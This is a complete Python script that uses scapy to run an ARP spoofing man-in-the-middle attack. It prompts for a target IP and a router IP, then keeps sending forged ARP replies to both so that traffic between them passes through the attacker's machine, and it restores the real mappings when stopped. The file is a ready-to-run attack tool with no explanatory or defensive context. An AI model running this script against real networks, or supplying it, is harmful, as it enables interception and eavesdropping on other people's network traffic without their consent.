#! /usr/bin/env python3

import scapy.all as scapy
import time

def spoof():
	Target_ip = input("Enter Target IP: ")
	Router_ip = input("Enter Router IP: ")
	print(" [+] Starting Attack")
	count = 0
	packet = scapy.ARP(op = 2, pdst = Target_ip, hwdst = get_MAC(Target_ip) , psrc = Router_ip)
	packet1 = scapy.ARP(op = 2, pdst = Router_ip, hwdst = get_MAC(Router_ip) , psrc = Target_ip)
	while(True):
		try:
			count = count + 1
			print(" [+] {} Packet Sent".format(count))
			scapy.send(packet,verbose = False)
			scapy.send(packet1,verbose = False)
			time.sleep(1)
		except:
			print(" [+] Stopping Attack ....")
			restore1 = scapy.ARP(op = 2, pdst = Target_ip, hwdst = get_MAC(Target_ip) , psrc = Router_ip , hwsrc = get_MAC(Router_ip))
			restore2 = scapy.ARP(op = 2, pdst = Router_ip, hwdst = get_MAC(Router_ip) , psrc = Target_ip , hwsrc = get_MAC(Target_ip))
			scapy.send(restore1,verbose = False,count = 5)
			scapy.send(restore2,verbose = False,count = 5)
			time.sleep(2)
			print(" [+] Stopped ")
			break
	
def get_MAC(Target_ip):
	arp_request = scapy.ARP(pdst=Target_ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
	arp_request_broadcast = broadcast / arp_request
#	arp_request_broadcast.summary()
	answered,unanswered = scapy.srp(arp_request_broadcast,timeout = 2,verbose = False)
	for elements in answered:
		return(elements[1].hwsrc)

def main():
	spoof()

main()
